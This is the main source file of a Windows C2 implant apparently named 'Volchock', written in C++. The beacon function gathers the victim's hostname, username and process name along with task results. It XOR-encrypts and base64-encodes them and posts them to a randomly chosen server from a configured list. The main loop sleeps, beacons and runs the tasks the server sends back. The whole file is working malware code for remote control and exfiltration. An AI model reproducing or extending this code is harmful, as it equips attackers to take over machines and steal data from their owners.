#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>  
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"
#include <random>
#include <ctime>

std::string beakon(const std::string& data_res) {
    std::string agent_id = generate_agent_id();
    std::string hostname = get_hostname();
    std::string username = get_username();
    std::string process_name = get_process_name();
    std::ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"results\":\"" << data_res << "\"";
    ss << "}";
    std::string result_json = ss.str();
    std::string encoded = xor_data(result_json, XOR_KEY);
    std::string b64_encoded = base64_encode(encoded);
    constexpr int VOLCHOCK_SERVERS_COUNT = sizeof(VOLCHOCK_SERVERS) / sizeof(VOLCHOCK_SERVERS[0]);
    std::mt19937 rng((unsigned int)std::time(nullptr));
    std::uniform_int_distribution<int> distrib(0, VOLCHOCK_SERVERS_COUNT - 1);
    int random_index = distrib(rng);
    std::string res = http_post(VOLCHOCK_SERVERS[random_index], VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
    return res;
}

void agent_run() {
    std::setvbuf(stdout, NULL, _IONBF, 0);
    std::string register_call = beakon("");
    std::string result;
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(BEACON_INTERVAL));
        std::string beakon_call = beakon(result);
        result = parse_task(beakon_call);
    }
}

int main() {
    //MessageBoxA(0, "START AGENT !", "Volchock", 0);
    agent_run();
    return 0;
}